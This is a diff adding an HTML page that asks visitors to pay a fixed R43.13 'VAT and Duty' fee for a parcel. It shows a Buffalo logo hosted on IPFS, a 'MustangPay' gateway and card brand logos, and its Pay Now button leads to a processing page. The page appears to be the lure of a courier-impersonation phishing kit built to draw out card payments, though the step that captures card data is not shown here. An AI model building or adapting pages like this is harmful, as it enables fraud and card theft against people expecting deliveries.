@@ -1,0 +1,92 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>VAT & Duty Payment</title>
+<link rel="icon" href="img/BFL-FVC.png" type="image/jpeg">
+
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;background:#efe6d4;color:#222;display:flex;justify-content:center;}
+  .page{width:100%;max-width:420px;padding:20px 16px 30px;}
+  .header{display:flex;align-items:center;gap:10px;margin-bottom:18px;}
+  .header img{height:28px;}
+  h1{font-size:26px;font-weight:600;margin:14px 0 20px;}
+  .card{background:#fff;border-radius:18px;padding:22px 18px 26px;box-shadow:0 10px 24px rgba(0,0,0,.08);}
+  .divider{height:1px;background:#eee;margin-bottom:18px;}
+  .section-title{font-size:18px;font-weight:600;text-align:center;margin-bottom:18px;}
+  .method-box{border:2px solid #c7654b;border-radius:14px;padding:18px;text-align:center;color:#c7654b;font-weight:600;margin-bottom:22px;}
+  .method-box .icon{font-size:22px;margin-bottom:6px;}
+  .gateway{display:flex;align-items:center;gap:8px;margin-bottom:12px;}
+  .gateway img{height:22px;} /* logo matches text size */
+  .info{width:18px;height:18px;border-radius:50%;border:1px solid #aaa;font-size:12px;display:flex;align-items:center;justify-content:center;color:#777;}
+  .payment-option{border:2px solid #c7654b;border-radius:14px;padding:16px;display:flex;align-items:center;justify-content:space-between;margin-bottom:26px;}
+  .left-option{display:flex;align-items:center;gap:10px;font-weight:600;}
+  .radio{width:18px;height:18px;border-radius:50%;border:2px solid #c7654b;display:flex;align-items:center;justify-content:center;}
+  .radio::after{content:"";width:8px;height:8px;background:#c7654b;border-radius:50%;}
+  .cards img{height:22px;margin-left:6px;}
+  .pay-btn{width:100%;padding:16px;border:none;border-radius:32px;background:#e06a2f;color:#fff;font-size:18px;font-weight:600;cursor:pointer;}
+  .pay-btn:active{transform:scale(.98);}
+  .info-box{margin-bottom:18px;font-size:14px;}
+  .info-box div{margin:4px 0;}
+</style>
+</head>
+
+<body>
+<div class="page">
+  <div class="header">
+    <img src="https://ipfs.io/ipfs/bafkreift76igpyooavjbhnueqp2pdn5a3q3iczjmp5smq6d2vdxqc2uxsq" alt="Buffalo">
+  </div>
+
+  <h1>Payment for VAT and Duty of your parcel(s)</h1>
+
+  <div class="card">
+    <div class="info-box" id="infoBox">
+      <!-- Order Number, Remark, Amount will appear here -->
+    </div>
+
+    <div class="divider"></div>
+    <div class="section-title">Choose one method to pay</div>
+
+    <div class="method-box"><div class="icon">🌐</div>Online payment</div>
+
+    <div class="gateway">
+      <!-- MustangPay logo -->
+      <img src="img/MstgPay2.png" alt="MustangPay Logo">
+      <span class="info">?</span>
+    </div>
+
+    <div class="payment-option">
+      <div class="left-option">
+        <div class="radio"></div>Card Payment
+      </div>
+      <div class="cards">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg">
+      </div>
+    </div>
+
+    <button class="pay-btn" onclick="payNow()">Pay Now</button>
+  </div>
+</div>
+
+<script>
+  const orderNumber = localStorage.getItem('orderNumber') || '—';
+  const remark = localStorage.getItem('remark') || '—';
+  const amountDue = 'R43.13'; // fixed amount
+
+  const infoBox = document.getElementById('infoBox');
+  infoBox.innerHTML = `
+    <div><strong>Order Number:</strong> ${orderNumber}</div>
+    <div><strong>Remark:</strong> ${remark}</div>
+    <div><strong>Amount due:</strong> ${amountDue}</div>
+  `;
+
+  function payNow(){
+    window.location.href = "processing.html";
+  }
+</script>
+</body>
+</html>
